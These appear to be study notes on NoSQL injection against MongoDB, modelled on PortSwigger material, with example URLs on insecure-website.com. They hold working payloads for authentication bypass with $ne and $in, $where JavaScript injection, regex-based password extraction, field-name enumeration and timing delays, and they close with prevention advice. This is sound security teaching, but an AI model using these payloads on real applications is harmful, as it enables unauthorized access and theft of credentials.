# **NoSQL injection**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database.</span>

<span style="font-size: 17px">NoSQL injection may enable an attacker to:</span>

- <span style="font-size: 17px">Bypass authentication or protection mechanisms.</span>
- <span style="font-size: 17px">Extract or edit data.</span>
- <span style="font-size: 17px">Cause a denial of service.</span>
- <span style="font-size: 17px">Execute code on the server.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">There are two different types of NoSQL injection:</span>

1. <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in </span>[SQL injection](https://portswigger.net/web-security/sql-injection)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">.</span>
2. <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Operator injection - This occurs when you can use NoSQL query operators to manipulate queries</span>

## **NoSQL syntax injection**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If you know the API language of the target database, use special characters and fuzz strings that are relevant to that language.</span>

### **<span style="font-size: 19px">Detecting syntax injection in MongoDB</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">When the user selects the </span>**Fizzy drinks**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> category, their browser requests the following URL:</span>

```http
https://insecure-website.com/product/lookup?category=fizzy
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To test whether the input may be vulnerable, submit a fuzz string in the value of the </span>`category`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> parameter.</span>

```http
'"`{
;$Foo}
$Foo \xYZ
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Use this fuzz string to construct the following attack:</span>

```http
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

#### **<span style="font-size: 19px">Determining which characters are processed</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To determine which characters are interpreted as syntax by the application, you can inject individual characters.</span>

```javascript
this.category == '''
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If this causes a change from the original response, this may indicate that the </span>`'`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> character has broken the query syntax and caused a syntax error.</span>

```javascript
this.category == '\''
```

<span style="font-size: 17px">If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack</span>.

#### **<span style="font-size: 19px">Confirming conditional behavior</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements </span>`' && 0 && 'x`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> and </span>`' && 1 && 'x`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> as follows</span>

```http
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query</span>

#### **<span style="font-size: 19px">Overriding existing conditions</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as </span>`'||1||'`

```http
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```

```javascript
this.category == 'fizzy'||'1'=='1'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You could also add a null character after the category value. MongoDB may ignore all characters after a null character.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">For example, the query may have an additional </span>`this.released`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> restriction</span>

```javascript
this.category == 'fizzy' && this.released == 1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In this case, an attacker could construct an attack as follows:</span>

```http
https://insecure-website.com/product/lookup?category=fizzy'%00
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This results in the following NoSQL query</span>

```javascript
this.category == 'fizzy'\u0000' && this.released == 1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the </span>`fizzy`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> category are displayed, including unreleased products</span>

**<span style="font-size: 23px">NoSQL operator injection</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result.</span>

- `$where`<span style="font-size: 17px"> - Matches documents that satisfy a JavaScript expression.</span>
- `$ne`<span style="font-size: 17px"> - Matches all values that are not equal to a specified value.</span>
- `$in`<span style="font-size: 17px"> - Matches all of the values specified in an array.</span>
- `$regex`<span style="font-size: 17px"> - Selects documents where values match a specified regular expression.</span>

### **<span style="font-size: 19px">Submitting query operators</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In JSON messages, you can insert query operators as nested objects. For example, </span>`{"username":"wiener"}`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> becomes </span>`{"username":{"$ne":"invalid"}}`

<span style="font-size: 17px">For URL-based inputs, you can insert query operators via URL parameters. For example, </span>`username=wiener`<span style="font-size: 17px"> becomes </span>`username[$ne]=invalid`<span style="font-size: 17px">. If this doesn't work, you can try the following:</span>

1. <span style="font-size: 17px">Convert the request method from </span>`GET`<span style="font-size: 17px"> to </span>`POST`<span style="font-size: 17px">.</span>
2. <span style="font-size: 17px">Change the </span>`Content-Type`<span style="font-size: 17px"> header to </span>`application/json`<span style="font-size: 17px">.</span>
3. <span style="font-size: 17px">Add JSON to the message body.</span>
4. <span style="font-size: 17px">Inject query operators in the JSON</span>

### **<span style="font-size: 19px">Detecting operator injection in MongoDB</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Consider a vulnerable application that accepts a username and password in the body of a </span>`POST`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> request</span>

```javascript
{"username":"wiener","password":"peter"}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection</span>

```javascript
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the </span>`$ne`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator is applied, this queries all users where the username is not equal to </span>`invalid`

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload</span>

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To target an account, you can construct a payload that includes a known username, or a username that you've guessed.</span>

```javascript
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## **Exploiting syntax injection to extract data**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's </span>`$where`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator and </span>`mapReduce()`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> function.</span>

### **<span style="font-size: 19px">Exfiltrating data in MongoDB</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Consider a vulnerable application that allows users to look up other registered usernames and displays their role.</span>

```http
https://insecure-website.com/user/lookup?username=admin
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This results in the following NoSQL query of the </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> collection</span>

```javascript
{"$where":"this.username == 'admin'"}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">As the query uses the </span>`$where`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data.</span>

```javascript
admin' && this.password[0] == 'a' || 'a'=='b
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You could also use the JavaScript </span>`match()`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> function to extract information. For example, the following payload enables you to identify whether the password contains digits</span>

```javascript
admin' && this.password.match(/\d/) || 'a'=='b
```

#### **<span style="font-size: 19px">Identifying field names</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You may need to identify valid fields in the collection before you can extract data using JavaScript injection</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Identify whether the MongoDB database contains a </span>`password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> field, you could submit the following payload</span>

```http
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> field exists, so you could send the following payloads</span>

```http
admin' && this.username!='
```

```http
admin' && this.foo!='
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the </span>`password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> field exists, you'd expect the response to be identical to the response for the existing field (</span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">), but different to the response for the field that doesn't exist (</span>`foo`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">).</span>

## **Exploiting NoSQL operator injection to extract data**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.</span>

### **<span style="font-size: 19px">Injecting operators in MongoDB</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To test whether you can inject operators, you could try adding the </span>`$where`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true.</span>

```javascript
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If there is a difference between the responses, this may indicate that the JavaScript expression in the </span>`$where`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> clause is being evaluated.</span>

#### **<span style="font-size: 19px">Extracting field names</span>**

<span style="font-size: 17px">If you have injected an operator that enables you to run JavaScript, you may be able to use the </span>`keys()`<span style="font-size: 17px"> method to extract the name of data fields. For example, you could submit the following payload:</span>

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

<span style="font-size: 17px">This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character</span>

#### **<span style="font-size: 19px">Exfiltrating data using operators</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the </span>`$regex`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator to extract data character by character</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Consider a vulnerable application that accepts a username and password in the body of a </span>`POST`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> request.</span>

```javascript
{"username":"myuser","password":"mypass"}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You could start by testing whether the </span>`$regex`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator is processed as follows:</span>

```javascript
{"username":"admin","password":{"$regex":"^.*"}}
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You can use the </span>`$regex`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> operator to extract data character by character. For example, the following payload checks whether the password begins with an </span>`a`

```javascript
{"username":"admin","password":{"$regex":"^a*"}}
```

## **Timing based injection**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To conduct timing-based NoSQL injection</span>

1. <span style="font-size: 17px">Load the page several times to determine a baseline loading time.</span>
2. <span style="font-size: 17px">Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, </span>`{"$where": "sleep(5000)"}`<span style="font-size: 17px"> causes an intentional delay of 5000 ms on successful injection.</span>
3. <span style="font-size: 17px">Identify whether the response loads more slowly. This indicates a successful injection.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The following timing based payloads will trigger a time delay if the password beings with the letter </span>`a`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">:</span>

```javascript
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

## **Preventing NoSQL injection**

- <span style="font-size: 19px">Sanitize and validate user input, using an allowlist of accepted characters.</span>
- <span style="font-size: 19px">Insert user input using parameterized queries instead of concatenating user input directly into the query.</span>
- <span style="font-size: 19px">To prevent operator injection, apply an allowlist of accepted keys.</span>